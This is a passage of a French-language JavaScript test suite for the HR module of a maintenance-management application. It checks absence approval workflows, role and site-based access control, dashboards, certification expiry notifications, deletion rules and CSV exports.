    assert.ok(evenements.some((e) => e.evt === 'rh:absenceValidee' && e.d.absence.id === a.id && e.d.userId === empUser.id));
    assert.ok(notifsDe(empUser.id).some((n) => n.titre === 'Absence validée'), 'la personne est notifiée');
    assert.equal((await chefEquipe.post(`/api/rh/absences/${a.id}/valider`, {})).status, 400, 'déjà traitée');

    // Refus (motif obligatoire)
    const a2 = await emp.ok('POST', '/api/rh/moi/absences', { typeCode: 'rtt', dateDebut: dans(45), demiJournee: 'apres_midi' });
    assert.equal(a2.nbJours, outils.estOuvre(dans(45)) ? 0.5 : 0);
    assert.equal((await chefEquipe.post(`/api/rh/absences/${a2.id}/refuser`, {})).status, 400, 'motif obligatoire');
    const ref = await chefEquipe.ok('POST', `/api/rh/absences/${a2.id}/refuser`, { motif: 'Inventaire annuel ce jour-là' });
    assert.equal(ref.statut, 'refusee');
    assert.equal(ref.motifDecision, 'Inventaire annuel ce jour-là');
    assert.ok(evenements.some((e) => e.evt === 'rh:absenceRefusee' && e.d.absence.id === a2.id));
    // Demi-journées complémentaires le même jour autorisées
    const am = await emp.ok('POST', '/api/rh/moi/absences', { typeCode: 'rtt', dateDebut: dans(50), demiJournee: 'matin' });
    const pm = await emp.ok('POST', '/api/rh/moi/absences', { typeCode: 'rtt', dateDebut: dans(50), demiJournee: 'apres_midi' });
    assert.ok(am.id && pm.id);

    // Mon dossier : lecture seule de son propre dossier, sans coût horaire ni notes RH
    const moi = await emp.ok('GET', '/api/rh/moi');
    assert.equal(moi.personnel.id, p.id);
    assert.equal('coutHoraire' in moi.personnel, false);
    assert.equal('notes' in moi.personnel, false);
    assert.equal(moi.absences.length, 4);
    assert.equal(moi.absences.find((x) => x.id === a.id).annulable, true, 'absence validée future annulable');
    assert.ok(Array.isArray(moi.habilitations) && Array.isArray(moi.visites) && Array.isArray(moi.formations));
    assert.equal((await emp.get('/api/rh/personnel/' + p.id)).status, 403, 'pas d\'accès au module sans rh › voir');
    // Annulation par la personne
    const an = await emp.ok('POST', `/api/rh/moi/absences/${a.id}/annuler`, {});
    assert.equal(an.statut, 'annulee');
    assert.ok(evenements.some((e) => e.evt === 'rh:absenceAnnulee' && e.d.absence.id === a.id && e.d.ancienStatut === 'validee'));
    assert.equal((await emp.post(`/api/rh/moi/absences/${a.id}/annuler`, {})).status, 400, 'déjà annulée');
    assert.equal((await autre.post(`/api/rh/moi/absences/${am.id}/annuler`, {})).status, 404, 'pas l\'absence d\'un autre');
    assert.equal((await autre.post(`/api/rh/absences/${am.id}/annuler`, {})).status, 403);
    // Sans fiche du personnel : demande impossible
    assert.equal((await autre.post('/api/rh/moi/absences', { typeCode: 'conges', dateDebut: dans(30) })).status, 400);
  });

  test('absences : saisie par les RH, droits de décision, validation réservée au N+1 (option de workflow)', async () => {
    const { c: rh, user: rhUser } = await compte('gestrh', 'Gestionnaire RH', [prod.id], { nom: 'RH', prenom: 'Gina' });
    const { user: mgr } = await compte('manager2', 'Technicien', [prod.id]);
    const p = await personne({ nom: 'Saisi', prenom: 'Sam', secteurId: prod.id, managerUserId: mgr.id });
    const moiRh = await personne({ userId: rhUser.id, secteurId: prod.id });
    // Les RH saisissent une absence directement validée (ex. arrêt de travail)
    const arret = await rh.ok('POST', '/api/rh/absences', { personnelId: p.id, typeCode: 'maladie', dateDebut: dans(-1), dateFin: dans(1), statut: 'validee' });
    assert.equal(arret.statut, 'validee');
    assert.equal(arret.valideurUserId, rhUser.id);
    assert.equal((await rh.post('/api/rh/absences', { personnelId: p.id, typeCode: 'conges', dateDebut: dans(0) })).status, 400, 'chevauchement');
    assert.equal((await rh.post('/api/rh/absences', { personnelId: p.id, typeCode: 'conges', dateDebut: dans(60), statut: 'refusee' })).status, 400);
    assert.equal((await rh.post('/api/rh/absences', { personnelId: moiRh.id, typeCode: 'conges', dateDebut: dans(60), statut: 'validee' })).status, 403, 'pas d\'auto-validation');
    // Un valideur RH (rh › valider) décide d'une demande de son périmètre
    const dem = await rh.ok('POST', '/api/rh/absences', { personnelId: p.id, typeCode: 'conges', dateDebut: dans(70), dateFin: dans(72) });
    assert.equal(dem.statut, 'demandee');
    assert.equal(dem.peutDecider, true);
    assert.ok((await rh.ok('GET', '/api/rh/absences?aValider=1')).some((x) => x.id === dem.id));
    // Option : seul le N+1 valide
    const cfg = srv.db.getConfig();
    cfg.workflow.validerParSuperieurUniquement = true;
    srv.db.setConfig(cfg);
    assert.equal((await rh.post(`/api/rh/absences/${dem.id}/valider`, {})).status, 403, 'réservé au N+1');
    assert.equal((await rh.ok('GET', '/api/rh/absences?aValider=1')).some((x) => x.id === dem.id), false);
    cfg.workflow.validerParSuperieurUniquement = false;
    srv.db.setConfig(cfg);
    const ok = await rh.ok('POST', `/api/rh/absences/${dem.id}/valider`, { motif: '' });
    assert.equal(ok.statut, 'validee');
    // Sa propre demande : un autre valideur doit décider
    const sienne = await rh.ok('POST', '/api/rh/moi/absences', { typeCode: 'rtt', dateDebut: dans(80) });
    assert.equal((await rh.post(`/api/rh/absences/${sienne.id}/valider`, {})).status, 403);
    assert.equal((await admin.ok('POST', `/api/rh/absences/${sienne.id}/valider`, {})).statut, 'validee', 'l\'administrateur peut valider');
    // Modification et annulation par les RH (y compris une absence commencée)
    const modif = await rh.ok('PUT', `/api/rh/absences/${arret.id}`, { dateFin: dans(3), commentaire: 'Prolongation' });
    assert.equal(modif.dateFin, dans(3));
    assert.equal(modif.statut, 'validee');
    const annule = await rh.ok('POST', `/api/rh/absences/${arret.id}/annuler`, {});
    assert.equal(annule.statut, 'annulee');
    assert.equal((await rh.put(`/api/rh/absences/${arret.id}`, { commentaire: 'x' })).status, 400, 'absence annulée figée');
    // Filtres
    const liste = await rh.ok('GET', `/api/rh/absences?personnelId=${p.id}&statut=validee`);
    assert.deepEqual(liste.map((x) => x.id), [dem.id]);
    assert.ok((await rh.ok('GET', `/api/rh/absences?du=${dans(71)}&au=${dans(71)}`)).some((x) => x.id === dem.id));
    assert.equal((await rh.ok('GET', `/api/rh/absences?du=${dans(69)}&au=${dans(69)}`)).some((x) => x.id === dem.id), false);
    // Suppression réservée à rh › supprimer
    const { c: resp } = await compte('respmaint', 'Responsable maintenance', []);
    assert.equal((await resp.del(`/api/rh/absences/${dem.id}`)).status, 403);
    await rh.ok('DELETE', `/api/rh/absences/${dem.id}`);
  });

  // ------------------------------------------------------------------------------------------------
  test('droits : 403 sans rh › voir, en écriture avec rh › voir seul, exports réservés', async () => {
    const { c: tech } = await compte('techsansrh', 'Technicien', [maint.id]);
    for (const url of ['/api/rh/personnel', '/api/rh/habilitations', '/api/rh/formations', '/api/rh/visites', '/api/rh/absences', '/api/rh/alertes', '/api/rh/tableau', '/api/rh/matrice', '/api/rh/references', '/api/rh/export/personnel']) {
      assert.equal((await tech.get(url)).status, 403, url);
    }
    assert.equal((await tech.get('/api/rh/moi')).status, 200, 'Mon dossier RH : tout utilisateur authentifié');
    const anonyme = srv.client();
    assert.equal((await anonyme.get('/api/rh/moi')).status, 401);
    const { c: chef } = await compte('chefdroits', 'Chef de secteur', [prod.id]);
    const p = await personne({ nom: 'Cible', secteurId: prod.id });
    assert.equal((await chef.get('/api/rh/personnel/' + p.id)).status, 200);
    assert.equal((await chef.post('/api/rh/personnel', { nom: 'X', secteurId: prod.id })).status, 403);
    assert.equal((await chef.put('/api/rh/personnel/' + p.id, { nom: 'Y' })).status, 403);
    assert.equal((await chef.del('/api/rh/personnel/' + p.id)).status, 403);
    assert.equal((await chef.post('/api/rh/habilitations', { personnelId: p.id, typeCode: 'sst', dateObtention: '2025-01-01' })).status, 403);
    assert.equal((await chef.post('/api/rh/formations', { intitule: 'X', dateDebut: dans(1), personnelIds: [p.id] })).status, 403);
    assert.equal((await chef.post('/api/rh/visites', { personnelId: p.id, date: dans(-1) })).status, 403);
    assert.equal((await chef.post('/api/rh/absences', { personnelId: p.id, typeCode: 'conges', dateDebut: dans(5) })).status, 403);
    assert.equal((await chef.post('/api/rh/verifier-echeances', {})).status, 403);
    assert.equal((await chef.get('/api/rh/export/personnel')).status, 403, 'export réservé à rh › exporter');
    const csrf = await fetch(srv.base + '/api/rh/personnel', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' });
    assert.equal(csrf.status, 403, 'en-tête anti-CSRF obligatoire');
  });

  test('portée par secteur : un chef de secteur ne voit que le personnel de son secteur', async () => {
    const pProd = await personne({ nom: 'Production', prenom: 'Pia', secteurId: prod.id });
    const pMaint = await personne({ nom: 'Maintenance', prenom: 'Max', secteurId: maint.id });
    const hMaint = await admin.ok('POST', '/api/rh/habilitations', { personnelId: pMaint.id, typeCode: 'sst', dateObtention: dans(-10) });
    const aMaint = await admin.ok('POST', '/api/rh/absences', { personnelId: pMaint.id, typeCode: 'conges', dateDebut: dans(90), statut: 'validee' });
    const { c: chef } = await compte('chefprod', 'Chef de secteur', [prod.id]);
    const liste = await chef.ok('GET', '/api/rh/personnel');
    assert.ok(liste.some((x) => x.id === pProd.id));
    assert.equal(liste.some((x) => x.id === pMaint.id), false);
    assert.ok(liste.every((x) => perms().secteursDescendants(srv.db, [prod.id]).includes(x.secteurId)));
    assert.equal((await chef.get('/api/rh/personnel/' + pMaint.id)).status, 404);
    assert.equal((await chef.get('/api/rh/habilitations/' + hMaint.id)).status, 404);
    assert.equal((await chef.get('/api/rh/absences/' + aMaint.id)).status, 404);
    assert.equal((await chef.ok('GET', '/api/rh/habilitations')).some((h) => h.id === hMaint.id), false);
    assert.equal((await chef.ok('GET', '/api/rh/matrice')).personnel.some((x) => x.id === pMaint.id), false);
    assert.equal((await chef.ok('GET', '/api/rh/alertes')).habilitations.some((x) => x.personnelId === pMaint.id), false);
    assert.equal((await chef.ok('GET', '/api/rh/calendrier?du=' + dans(85) + '&au=' + dans(95))).some((x) => x.id === aMaint.id), false);
    // Un créateur limité à son secteur ne crée pas de fiche ailleurs
    const { c: createur } = await compte('createurprod', 'Chef de secteur', [prod.id], { overrides: { rh: { creer: true, modifier: true } } });
    assert.equal((await createur.post('/api/rh/personnel', { nom: 'Hors portée', secteurId: maint.id })).status, 403);
    assert.equal((await createur.post('/api/rh/habilitations', { personnelId: pMaint.id, typeCode: 'sst', dateObtention: dans(-1) })).status, 404);
    assert.equal((await createur.put('/api/rh/personnel/' + pProd.id, { secteurId: maint.id })).status, 403, 'mutation hors portée refusée');
  });
  const perms = () => srv.ctx.perms;

  test('multi-site : isolement des sites, accès en lecture seule, filtre X-GMAO-Site', async () => {
    const p1 = await personne({ nom: 'Carpentras', prenom: 'Claire', secteurId: prod.id });
    const p2 = await personne({ nom: 'Valréas', prenom: 'Victor', secteurId: prod2.id });
    const h2 = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p2.id, typeCode: 'elec_b0', dateObtention: dans(-20) });
    const a2 = await admin.ok('POST', '/api/rh/absences', { personnelId: p2.id, typeCode: 'conges', dateDebut: dans(100), dateFin: dans(101) });
    assert.equal(h2.secteurId, prod2.id);
    // Gestionnaire RH rattaché au site 1 (portée « site »)
    const { c: rh1 } = await compte('rhsite1', 'Gestionnaire RH', [prod.id]);
    const l1 = await rh1.ok('GET', '/api/rh/personnel');
    assert.ok(l1.some((x) => x.id === p1.id));
    assert.equal(l1.some((x) => x.id === p2.id), false, 'site 2 invisible');
    assert.equal((await rh1.get('/api/rh/personnel/' + p2.id)).status, 404);
    assert.equal((await rh1.get('/api/rh/habilitations/' + h2.id)).status, 404);
    assert.equal((await rh1.post('/api/rh/personnel', { nom: 'Intrus', secteurId: prod2.id })).status, 403);
    assert.equal((await rh1.post(`/api/rh/absences/${a2.id}/valider`, {})).status, 404);
    assert.equal((await rh1.ok('GET', '/api/rh/tableau')).effectifs.parSite.some((s) => s.id === site2.id), false);
    // Accès supplémentaire en lecture seule au site 2
    const { c: rhL } = await compte('rhlecture', 'Gestionnaire RH', [prod.id], { siteAcces: [{ siteId: site2.id, mode: 'lecture' }] });
    const vu = await rhL.ok('GET', '/api/rh/personnel/' + p2.id);
    assert.equal(vu.id, p2.id, 'lecture autorisée');
    assert.equal(vu.modifiable, false);
    assert.ok((await rhL.ok('GET', '/api/rh/personnel')).some((x) => x.id === p2.id));
    assert.equal((await rhL.ok('GET', '/api/rh/personnel/' + p1.id)).modifiable, true);
    for (const [m, url, body] of [
      ['put', '/api/rh/personnel/' + p2.id, { fonction: 'X' }],
      ['del', '/api/rh/personnel/' + p2.id],
      ['post', '/api/rh/habilitations', { personnelId: p2.id, typeCode: 'sst', dateObtention: dans(-1) }],
      ['put', '/api/rh/habilitations/' + h2.id, { numero: 'X' }],
      ['post', '/api/rh/visites', { personnelId: p2.id, date: dans(-1) }],
      ['post', '/api/rh/absences', { personnelId: p2.id, typeCode: 'rtt', dateDebut: dans(120) }],
      ['post', `/api/rh/absences/${a2.id}/valider`, {}],
      ['post', '/api/rh/formations', { intitule: 'X', dateDebut: dans(3), personnelIds: [p2.id] }],
      ['post', '/api/rh/personnel', { nom: 'Nouveau V', secteurId: prod2.id }],
    ]) {
      const r = await rhL[m](url, body);
      assert.equal(r.status, 403, `${m.toUpperCase()} ${url} : lecture seule → ${r.status} ${JSON.stringify(r.body)}`);
    }
    assert.equal(srv.db.get('absences', a2.id).statut, 'demandee');
    // Filtre de site courant (en-tête)
    const cv = clientSite(site2.id);
    await cv.login('admin', 'admin');
    const lv = await cv.ok('GET', '/api/rh/personnel');
    assert.ok(lv.length >= 1);
    assert.ok(lv.every((x) => x.siteId === site2.id), 'seul le site 2');
    assert.equal((await cv.get('/api/rh/personnel/' + p1.id)).status, 404);
    assert.ok((await cv.ok('GET', '/api/rh/habilitations')).every((h) => perms().siteDuSecteur(srv.db, h.secteurId) === site2.id));
    assert.ok((await cv.ok('GET', '/api/rh/absences')).every((x) => x.secteurId === prod2.id));
    assert.ok((await cv.ok('GET', '/api/rh/matrice')).personnel.every((x) => x.siteId === site2.id));
    const tb = await cv.ok('GET', '/api/rh/tableau');
    assert.deepEqual(tb.effectifs.parSite.map((s) => s.id), [site2.id]);
    const c1 = clientSite(site1.id);
    await c1.login('admin', 'admin');
    assert.equal((await c1.ok('GET', '/api/rh/personnel')).some((x) => x.id === p2.id), false);
    // Une mutation vers le site 2 déplace les éléments rattachés
    const h1 = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p1.id, typeCode: 'sst', dateObtention: dans(-3) });
    await admin.ok('PUT', '/api/rh/personnel/' + p1.id, { secteurId: prod2.id });
    assert.equal(srv.db.get('habilitations', h1.id).secteurId, prod2.id);
    assert.equal((await rh1.get('/api/rh/habilitations/' + h1.id)).status, 404);
  });

  // ------------------------------------------------------------------------------------------------
  test('tableau de bord : effectifs, absents du jour, absentéisme du mois, coût des formations', async () => {
    const sg = secteurs.find((s) => s.code === 'SG');
    const p1 = await personne({ nom: 'Tableau', prenom: 'Un', secteurId: sg.id, typeContratCode: 'cdi' });
    const p2 = await personne({ nom: 'Tableau', prenom: 'Deux', secteurId: sg.id, typeContratCode: 'interim' });
    await admin.ok('POST', '/api/rh/absences', { personnelId: p1.id, typeCode: 'maladie', dateDebut: AUJ, dateFin: AUJ, statut: 'validee' });
    await admin.ok('POST', '/api/rh/absences', { personnelId: p2.id, typeCode: 'astreinte', dateDebut: AUJ, dateFin: AUJ, statut: 'validee' });
    await admin.ok('POST', '/api/rh/formations', { intitule: 'Gestes et postures', dateDebut: `${AUJ.slice(0, 4)}-01-15`, cout: 400, personnelIds: [p1.id, p2.id], statut: 'realisee', dureeHeures: 3 });
    const t = await admin.ok('GET', `/api/rh/tableau?secteurId=${sg.id}`);
    assert.equal(t.effectifs.total, 2);
    assert.deepEqual(t.effectifs.parContrat.map((c) => c.code).sort(), ['cdi', 'interim']);
    assert.deepEqual(t.absentsAujourdhui.map((x) => x.personnelId), [p1.id], 'une astreinte n\'est pas une absence');
    const ouvre = outils.estOuvre(AUJ);
    assert.equal(t.absenteisme.effectif, 2);
    assert.equal(t.absenteisme.joursTheoriques, t.absenteisme.joursOuvres * 2);
    assert.equal(t.absenteisme.joursAbsenteisme, ouvre ? 1 : 0, 'maladie comptée dans l\'absentéisme');
    assert.equal(t.absenteisme.taux, ouvre ? Math.round((1 / t.absenteisme.joursTheoriques) * 10000) / 100 : 0);
    const global = await admin.ok('GET', '/api/rh/tableau');
    assert.equal(global.formations.annee, AUJ.slice(0, 4));
    assert.ok(global.formations.coutRealise >= 400);
    assert.ok(global.formations.nbRealisees >= 1);
    assert.ok(global.effectifs.total >= 2);
    assert.ok(typeof global.alertes.total === 'number' && typeof global.demandesAValider === 'number');
    assert.ok(global.habilitations.total >= global.habilitations.valides);
  });

  test('calendrier (planning) : absences validées, nature masquée sans droit RH, option de configuration', async () => {
    const { c: tech } = await compte('techplanning', 'Technicien', [log.id]);
    const { c: dem } = await compte('demcal', 'Demandeur', [log.id]);
    const p = await personne({ nom: 'Calendrier', secteurId: log.id });
    const m = await admin.ok('POST', '/api/rh/absences', { personnelId: p.id, typeCode: 'maladie', dateDebut: dans(150), dateFin: dans(152), statut: 'validee' });
    const ast = await admin.ok('POST', '/api/rh/absences', { personnelId: p.id, typeCode: 'astreinte', dateDebut: dans(160), dateFin: dans(166), statut: 'validee' });
    const att = await admin.ok('POST', '/api/rh/absences', { personnelId: p.id, typeCode: 'conges', dateDebut: dans(170) });
    const url = `/api/rh/calendrier?du=${dans(140)}&au=${dans(175)}`;
    const vueRh = await admin.ok('GET', url);
    assert.equal(vueRh.find((x) => x.id === m.id).typeCode, 'maladie');
    assert.equal(vueRh.some((x) => x.id === att.id), false, 'seules les absences validées');
    assert.ok((await admin.ok('GET', url + '&demandes=1')).some((x) => x.id === att.id));
    const vueTech = await tech.ok('GET', url);
    const mt = vueTech.find((x) => x.id === m.id);
    assert.equal(mt.typeCode, null, 'nature d\'une absence non communiquée sans droit RH');
    assert.equal(mt.libelle, 'Absent');
    assert.equal(vueTech.find((x) => x.id === ast.id).libelle, 'Astreinte');
    assert.equal(vueTech.find((x) => x.id === ast.id).absent, false);
    assert.equal((await tech.ok('GET', url + '&demandes=1')).some((x) => x.id === att.id), false);
    assert.equal((await dem.get(url)).status, 403, 'ni RH ni planning');
    assert.equal((await admin.get('/api/rh/calendrier?du=2026-01-10&au=2025-01-01')).status, 400);
    const cfg = srv.db.getConfig();
    cfg.rh.afficherAbsencesPlanning = false;
    srv.db.setConfig(cfg);
    assert.deepEqual(await tech.ok('GET', url), [], 'absences masquées dans le planning');
    assert.ok((await admin.ok('GET', url)).length >= 2, 'toujours visibles pour les RH');
    cfg.rh.afficherAbsencesPlanning = true;
    srv.db.setConfig(cfg);
  });

  test('services publiés et habilitations d\'un technicien pour les autres modules', async () => {
    const rh = srv.ctx.services.rh;
    assert.equal(typeof rh.absencesEntre, 'function');
    const { c: tech, user } = await compte('techhab', 'Technicien', [maint.id]);
    const { c: it } = await compte('informaticien', 'Pôle informatique', []);
    const p = await personne({ userId: user.id, secteurId: maint.id });
    await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'elec_b2v', dateObtention: dans(-100) });
    await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'permis_feu', dateObtention: outils.ajouterMois(dans(-3), -12) });
    const abs = await admin.ok('POST', '/api/rh/absences', { personnelId: p.id, typeCode: 'conges', dateDebut: dans(200), dateFin: dans(204), statut: 'validee' });
    await admin.ok('POST', '/api/rh/absences', { personnelId: p.id, typeCode: 'astreinte', dateDebut: dans(210), dateFin: dans(211), statut: 'validee' });

    const valides = rh.habilitationsValides(user.id);
    assert.deepEqual(valides.map((h) => h.typeCode), ['elec_b2v'], 'habilitation expirée exclue');
    assert.equal(rh.habilitationValide(user.id, 'elec_b2v'), true);
    assert.equal(rh.habilitationValide(user.id, 'permis_feu'), false);
    assert.equal(rh.habilitationValide(user.id, 'permis_feu', dans(-30)), true, 'valide à une date passée');
    assert.deepEqual(rh.habilitationsValides(99999), []);
    assert.equal(rh.estAbsent(user.id, dans(202)), true);
    assert.equal(rh.estAbsent(user.id, dans(205)), false);
    assert.equal(rh.estAbsent(user.id, dans(210)), false, 'astreinte : présent');
    assert.equal(rh.absenceDe(user.id, dans(200)).id, abs.id);
    const entre = rh.absencesEntre(dans(195), dans(215), { secteurIds: [maint.id] });
    assert.ok(entre.some((x) => x.id === abs.id && x.userId === user.id && x.nbJours > 0));
    assert.equal(rh.absencesEntre(dans(195), dans(215), { secteurIds: [log.id] }).some((x) => x.id === abs.id), false);
    assert.ok(rh.absencesEntre(dans(195), dans(215), { userIds: [user.id] }).every((x) => x.userId === user.id));
    assert.equal(rh.personnelDeUser(user.id).id, p.id);
    assert.equal(rh.joursOuvres('2026-12-21', '2026-12-27'), 4, 'Noël 2026 (vendredi) férié');
    assert.equal(outils.paques(2026), '2026-04-05');

    const r = await tech.ok('GET', '/api/rh/habilitations-technicien/' + user.id);
    assert.equal(r.personnelId, p.id);
    assert.deepEqual(r.typeCodes, ['elec_b2v']);
    const autreTech = await admin.ok('GET', '/api/rh/habilitations-technicien/1');
    assert.equal(autreTech.personnelId, null);
    assert.deepEqual(autreTech.habilitations, []);
    assert.equal((await it.get('/api/rh/habilitations-technicien/' + user.id)).status, 403, 'sans droit métier ni RH');
    assert.equal((await it.get('/api/rh/habilitations-technicien/' + (await it.ok('GET', '/api/auth/me')).user.id)).status, 200, 'ses propres habilitations');
    assert.equal((await tech.get('/api/rh/habilitations-technicien/abc')).status, 400);
  });

  test('vérification quotidienne des échéances : notifications (RH, N+1, titulaire), événement, sans doublon', async () => {
    const { user: mgr } = await compte('mgrech', 'Technicien', [qual.id]);
    const { user: titulaire } = await compte('titulaire', 'Technicien', [qual.id]);
    const p = await personne({ userId: titulaire.id, secteurId: qual.id, managerUserId: mgr.id });
    const expiree = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'atex', dateObtention: outils.ajouterMois(dans(-2), -36) });
    const bientot = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'sst', dateObtention: outils.ajouterMois(dans(15), -24) });
    assert.equal(expiree.etat, 'expiree');
    const avant = evenements.length;
    const r = srv.ctx.services.rh.verifierEcheances();
    assert.ok(r.expirees >= 1 && r.bientot >= 1);
    const evts = evenements.slice(avant);
    const e = evts.find((x) => x.evt === 'rh:habilitationExpiree' && x.d.habilitation.id === expiree.id);
    assert.ok(e, 'événement rh:habilitationExpiree');
    assert.equal(e.d.personnel.id, p.id);
    assert.ok(evts.some((x) => x.evt === 'rh:habilitationBientotExpiree' && x.d.habilitation.id === bientot.id));
    const nMgr = notifsDe(mgr.id).filter((n) => /Habilitation expirée/.test(n.titre));
    assert.equal(nMgr.length, 1, 'le N+1 est notifié');
    assert.ok(notifsDe(titulaire.id).some((n) => /Habilitation expirée/.test(n.titre)), 'le titulaire est notifié');
    assert.ok(notifsDe(1).some((n) => /Habilitation expirée/.test(n.titre) && n.lien === `#/rh/${p.id}?onglet=habilitations`), 'les gestionnaires RH (rh › modifier) sont notifiés');
    // Deuxième passage : aucune nouvelle notification pour ces échéances
    const avant2 = evenements.length;
    srv.ctx.services.rh.verifierEcheances();
    assert.equal(evenements.slice(avant2).some((x) => x.d.habilitation && [expiree.id, bientot.id].includes(x.d.habilitation.id)), false);
    assert.equal(notifsDe(mgr.id).filter((n) => /Habilitation expirée/.test(n.titre)).length, 1);
    // Renouvellement : une nouvelle échéance pourra de nouveau être signalée
    const maj = await admin.ok('PUT', '/api/rh/habilitations/' + expiree.id, { dateObtention: dans(-1) });
    assert.equal(maj.etat, 'valide');
    assert.deepEqual(srv.db.get('habilitations', expiree.id).alertes, {});
    // Route explicite (rh › modifier)
    const viaRoute = await admin.ok('POST', '/api/rh/verifier-echeances', {});
    assert.equal(viaRoute.date, AUJ);
  });

  test('suppression : désactivation si historique, suppression sinon, effacement définitif réservé à l\'administrateur', async () => {
    const seul = await personne({ nom: 'Sans historique', secteurId: log.id });
    const r1 = await admin.ok('DELETE', '/api/rh/personnel/' + seul.id);
    assert.deepEqual(r1, { ok: true, desactive: false });
    assert.equal((await admin.get('/api/rh/personnel/' + seul.id)).status, 404);
    const hist = await personne({ nom: 'Avec historique', secteurId: log.id });
    const h = await admin.ok('POST', '/api/rh/habilitations', { personnelId: hist.id, typeCode: 'sst', dateObtention: dans(-5) });
    const r2 = await admin.ok('DELETE', '/api/rh/personnel/' + hist.id);
    assert.equal(r2.desactive, true);
    assert.equal(r2.references.habilitations, 1);
    assert.equal((await admin.ok('GET', '/api/rh/personnel/' + hist.id)).actif, false);
    assert.equal((await admin.ok('GET', '/api/rh/personnel?actif=1')).some((x) => x.id === hist.id), false);
    assert.ok((await admin.ok('GET', '/api/rh/personnel?actif=0')).some((x) => x.id === hist.id));
    const { c: rh } = await compte('rhsuppr', 'Gestionnaire RH', [log.id]);
    assert.equal((await rh.del(`/api/rh/personnel/${hist.id}?definitif=1`)).status, 403);
    const r3 = await admin.ok('DELETE', `/api/rh/personnel/${hist.id}?definitif=1`);
    assert.equal(r3.efface, true);
    assert.equal(srv.db.get('habilitations', h.id), null, 'éléments rattachés effacés');
    assert.equal(srv.db.get('personnel', hist.id), null);
  });

  test('exports CSV (droit exporter, coût horaire selon le droit de modification)', async () => {
    for (const quoi of ['personnel', 'habilitations', 'formations', 'visites', 'absences']) {
      const r = await admin.get('/api/rh/export/' + quoi);
      assert.equal(r.status, 200, quoi);
      assert.match(r.headers.get('content-type'), /text\/csv/);
      assert.match(r.headers.get('content-disposition'), new RegExp(`rh-${quoi}-\\d{4}-\\d{2}-\\d{2}\\.csv`));
    }
    // fetch().text() retire le BOM : contrôle sur les octets bruts
    const l = await fetch(srv.base + '/api/auth/login', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ login: 'admin', password: 'admin' }) });
    const brut = Buffer.from(await (await fetch(srv.base + '/api/rh/export/absences', { headers: { cookie: l.headers.get('set-cookie').split(';')[0] } })).arrayBuffer());
    assert.deepEqual([...brut.subarray(0, 3)], [0xef, 0xbb, 0xbf], 'BOM UTF-8 pour Excel');
    const csv = String((await admin.get('/api/rh/export/personnel')).body);
    assert.match(csv.split('\r\n')[0], /Matricule;Nom;Prénom/);
    assert.match(csv.split('\r\n')[0], /Coût horaire/);
    assert.ok(csv.includes('Durand'));
    const { c: lecteur } = await compte('exportlecteur', 'Chef de secteur', [maint.id], { overrides: { rh: { exporter: true } } });
    const csvL = String((await lecteur.get('/api/rh/export/personnel')).body);
    assert.equal(/Coût horaire/.test(csvL), false, 'colonne masquée sans rh › modifier');
    assert.equal(csvL.includes('Carpentras'), false, 'portée appliquée à l\'export');
    assert.equal((await admin.get('/api/rh/export/inconnu')).status, 404);
    assert.ok(srv.db.list('audit', (a) => a.action === 'export' && a.entite === 'personnel').length >= 1, 'export tracé');
  });

  // ------------------------------------------------------------------------------------------------
  test('habilitations d\'un technicien : portée, site de l\'en-tête et données du dossier contrôlés', async () => {
    const { c: vtech, user: vtechUser } = await compte('vtech', 'Technicien', [prod2.id], { nom: 'Rival', prenom: 'Valentin' });
    const p = await personne({ userId: vtechUser.id, secteurId: prod2.id });
    await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'elec_b2v', dateObtention: dans(-100), numero: 'HE-SECRET-42', organisme: 'Bureau Veritas' });
    const url = '/api/rh/habilitations-technicien/' + vtechUser.id;
    const { c: dem } = await compte('demprod2', 'Demandeur', [prod.id]);
    const { c: techMaint } = await compte('techmaint2', 'Technicien', [maint.id]);
    assert.equal((await dem.get(url)).status, 404, 'demandeur (portée perso) : personne hors portée malgré le droit métier');
    assert.equal((await techMaint.get(url)).status, 404, 'technicien d\'un autre secteur');
    const c1 = clientSite(site1.id);
    await c1.login('admin', 'admin');
    assert.equal((await c1.get(url)).status, 404, 'site 2 masqué par le site choisi dans l\'en-tête');
    const { c: techVal } = await compte('techval', 'Technicien', [prod2.id]);
    const vu = await techVal.ok('GET', url);
    assert.deepEqual(vu.typeCodes, ['elec_b2v'], 'même secteur : habilitations visibles');
    assert.equal('numero' in vu.habilitations[0], false, 'numéro de titre réservé au droit RH');
    assert.equal('organisme' in vu.habilitations[0], false);
    const { c: rhVal } = await compte('rhval', 'Gestionnaire RH', [prod2.id]);
    assert.equal((await rhVal.ok('GET', url)).habilitations[0].numero, 'HE-SECRET-42', 'avec rh › voir : numéro communiqué');
    assert.equal((await vtech.ok('GET', url)).habilitations[0].numero, 'HE-SECRET-42', 'ses propres habilitations');
  });

  test('absences : modification d\'une absence validée — validation à refaire sauf par un valideur, jamais la sienne', async () => {
    const { c: chef, user: chefUser } = await compte('chefc2', 'Technicien', [maint.id], { nom: 'Chef', prenom: 'Camille' });
    const { c: rh, user: rhUser } = await compte('rhc2', 'Gestionnaire RH', [maint.id], { nom: 'Soi', prenom: 'Sam' });
    const { c: rhSansValider } = await compte('rhnoval', 'Gestionnaire RH', [maint.id], { overrides: { rh: { valider: false } } });
    await personne({ userId: rhUser.id, secteurId: maint.id, managerUserId: chefUser.id });
    const autre = await personne({ nom: 'Autre', prenom: 'Alex', secteurId: maint.id, managerUserId: chefUser.id });
    // Sa propre absence, validée par le N+1 : intouchable
    const sienne = await rh.ok('POST', '/api/rh/moi/absences', { typeCode: 'conges', dateDebut: dans(300) });
    assert.equal((await chef.ok('POST', `/api/rh/absences/${sienne.id}/valider`, {})).statut, 'validee');
    assert.equal((await rh.put(`/api/rh/absences/${sienne.id}`, { dateFin: dans(314) })).status, 403, 'pas de modification de sa propre absence validée');
    assert.equal(srv.db.get('absences', sienne.id).dateFin, dans(300));
    // Absence validée d'autrui, modifiée sans droit de validation : elle repasse en attente et les valideurs sont prévenus
